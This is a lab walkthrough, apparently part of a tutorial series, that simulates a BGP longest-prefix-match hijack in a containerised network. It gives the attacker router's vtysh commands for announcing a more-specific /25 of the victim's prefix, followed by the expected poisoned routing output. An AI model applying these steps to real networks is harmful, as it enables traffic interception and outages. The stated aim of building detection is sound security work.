# Step 3 — BGP Hijack Simulation (Longest Prefix Match Attack)

---

## The Exploit: Longest Prefix Match (LPM)

To successfully hijack the victim's traffic, we exploit the most fundamental rule of internet routing:
**Longest Prefix Match (LPM)**.

The Victim (AS 100) is currently advertising `192.168.100.0/24`.

If the Attacker (AS 300) advertised the **exact same `/24`** network, the ISP might load-balance
between the two paths or prefer the Victim based on standard BGP tie-breakers. We don't want a tie.
We want **total control**.

The strategy: have the Attacker advertise a **more specific subnet — `192.168.100.0/25`**.

Because a `/25` is more specific than a `/24`, the ISP router will **automatically and unconditionally**
prioritize the attacker's route for the first half of the victim's IP space. Traffic is seamlessly
redirected without the ISP or the Victim ever realizing a breach has occurred.

> This is the **exact technique** used in the infamous **2008 Pakistan Telecom / YouTube hijack**,
> which took YouTube offline globally for approximately two hours.

---

## Phase 3.1 — Weaponize the Attacker (AS 300)

We configure the Attacker to falsely claim ownership of the Victim's more specific prefix.

```bash
docker exec -it attacker-r3 vtysh
```

```
configure terminal

! 1. Create the blackhole route for the stolen (more-specific) prefix
ip route 192.168.100.0/25 blackhole

! 2. Inject it into the BGP advertisement process
router bgp 300
 address-family ipv4 unicast
  network 192.168.100.0/25
 exit-address-family
exit
exit
write memory
exit
```

---

## Phase 3.2 — Verify the Poisoned Routing Table

Once the malicious payload is dropped, pivot immediately to the ISP router to confirm
the attack successfully altered the global routing table.

```bash
docker exec -it isp-r2 vtysh

# Check the BGP table — you should see both routes side by side
show ip bgp
```

#### Expected: The Poisoned BGP Table

```
*>  192.168.100.0/24   10.100.12.11    0    0    100 i    <- Victim's legitimate route
*>  192.168.100.0/25   10.100.23.13    0    0    300 i    <- Attacker's malicious hijack
```

The ISP router accepted the `/25` route from the Attacker (AS 300) and installed it right
next to the legitimate `/24` route from the Victim (AS 100). Both are marked with `*>` as
valid, best paths for their respective prefix lengths.

---

## Phase 3.3 — Confirm the Traffic Redirect (The Kill Shot)

Ask the ISP where it will send a packet destined for a specific victim IP — `192.168.100.10`:

```bash
show ip route 192.168.100.10
```

#### Expected: The Hijacked Routing Decision

```
Routing entry for 192.168.100.0/25
  Known via "bgp", distance 20, metric 0, best
  * 10.100.23.13, via eth1, weight 1
```

This is the kill shot.

When the ISP was asked where to send traffic for `192.168.100.10`, the routing engine applied
the LPM rule. Because `/25` is **more specific** than `/24`, it completely ignored the Victim's
legitimate route and forwarded all traffic to `10.100.23.13` — **the Attacker's router**.

The victim's traffic is now being hijacked. The ISP has no idea. No alarm has fired.

---

## Analysis Summary

| Route | Advertised by | Next-hop | Routing Decision |
|-------|--------------|----------|-----------------|
| `192.168.100.0/24` | AS 100 (Victim) | 10.100.12.11 | Installed in table but **bypassed** by LPM |
| `192.168.100.0/25` | AS 300 (Attacker) | 10.100.23.13 | **Wins** — more specific prefix takes absolute priority |

The vulnerability is **definitively proven**. Step 3 is complete.

We are now standing at the threshold of the detection phase. The next step is to build
a monitoring mechanism that watches the ISP router's BGP updates and flags this exact anomaly in real-time.
